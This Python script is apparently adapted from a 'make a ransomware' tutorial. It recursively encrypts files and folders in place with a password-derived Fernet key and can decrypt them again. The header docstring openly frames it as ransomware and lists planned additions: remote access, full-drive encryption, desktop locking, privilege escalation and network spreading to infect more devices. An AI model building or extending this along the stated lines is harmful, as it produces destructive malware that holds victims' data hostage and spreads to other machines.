#https://www.thepythoncode.com/article/make-a-ransomware-in-python
"""
    Areas to improve:
        - Combine into remote access
        - Crash case: cd with no arguments
    Areas to expand:
        - Encrypt entire hard drive, not only parent file down.
        - Lock desktop.
        - Privilege escalation within a system.
        - Network navigation to infect more devices.
"""

import base64
import getpass
import os
import pathlib
import secrets

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

def GenerateSalt(size=16):
    #Generate salt using secure random numbers from secrets
    return secrets.token_bytes(size)

def MakeKey(salt,password):
    #Initialize script algorithm with salt, length, CPU cost, block size, and parallelization
    kdf = Scrypt(salt=salt, length=32,n=2**14,r=8,p=1)
    return kdf.derive(password.encode())

def LoadSalt():
    #Load a salt from salt.salt file
    return open("salt.salt",'rb').read()

"""
    password = the string to generate the key from
    saltSize = salt size to generate
    loadSalt = whether we will load a previously generated salt
    saveSalt = whether we will save the new salt
"""
def GenerateKey(password,saltSize=16,loadSalt=False,saveSalt=True):
    if loadSalt:
        salt=LoadSalt()
    elif saveSalt:
        salt = GenerateSalt(saltSize)
        with open("salt.salt","wb") as saltFile:
            saltFile.write(salt)
    newKey = MakeKey(salt,password)
    #Return base64 encoded version of the key
    return base64.urlsafe_b64encode(newKey)

def Encrypt(filename,key):
    #Create Fernet object from key
    f = Fernet(key)
    #Read this file's data
    with open(filename, 'rb') as file:
        fileData = file.read()
    #Encrypt file data from previous step
    encryptedData = f.encrypt(fileData)
    #Write encrypted data to file
    with open(filename,'wb') as file:
        file.write(encryptedData)

def Decrypt(filename,key):
    f = Fernet(key)
    with open(filename,'rb') as file:
        encryptedData = file.read()
    #Decrypt data
    try:
        decryptedData = f.decrypt(encryptedData)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token; most likely the password is incorrect")
        return
    #Write original data back to file
    with open(filename,'wb') as file:
        file.write(decryptedData)

def EncryptFolder(name,key):
    #Encrypt folder and all contained files
    for child in pathlib.Path(name).glob('*'):
        if child.is_file():
            print(f"[!] Encrypting {child}")
            Encrypt(child,key)
        elif child.is_dir():
            EncryptFolder(child,key)

def DecryptFolder(name,key):
    #Decrypt the entire folder
    for child in pathlib.Path(name).glob('*'):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            Decrypt(child,key)
        elif child.is_dir():
            DecryptFolder(child,key)

#Now use argparse to make the script easily usable from command line
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="File Encryptor Script with Password")
    parser.add_argument("path", help="Path to encrypt/decrypt")
    parser.add_argument("-s", "--salt-size",help="If this is set, a new salt with the passed size is generated.",type=int)
    parser.add_argument("-e","--encrypt",action="store_true",help="Whether to encrypt the file/folder; only -e or -d can be specified.")
    parser.add_argument("-d","--decrypt",action="store_true",help="Whether to decrypt the file/folder; only -e or -d can be specified.")
    parser.add_argument("-p","--password",help="Set the encryption/decryption key you would like to use.",type=str)
   
    #Parse the arguments
    args = parser.parse_args()
    
    #Get the password
    if args.password:
        password = args.password
    else:
        raise TypeError("Must include a key for encryption/decryption.")
        
    """
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ")
    elif args.decrypt:
        password = getpass.getpass("Enter the password used for encryption: ")
    """
    
    #Generate the key
    if args.salt_size:
        if args.decrypt:
            raise TypeError("Do not use -s when decrypting")
        key = GenerateKey(password,saltSize=args.salt_size,saveSalt=True)
    else:
        key = GenerateKey(password,loadSalt=True)
    
    #Get the encrypt and decrypt flags
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    #Check if both -e and -d are specified
    if encrypt_ and decrypt_:
        raise TypeError("Please specify -e OR -d")
    elif encrypt_:
        #Encrypt a file
        if os.path.isfile(args.path):
            Encrypt(args.path,key)
        #Encrypt a folder
        elif os.path.isdir(args.path):
            EncryptFolder(args.path,key)
        else:
            raise TypeError("%s is neither file nor folder",args.path)
    elif decrypt_:
        if os.path.isfile(args.path):
            Decrypt(args.path,key)
        elif os.path.isdir(args.path):
            DecryptFolder(args.path,key)
        else:
            raise TypeError("%s is neither file nor folder",args.path)
    else:
        raise TypeError("Please specify -e OR -d")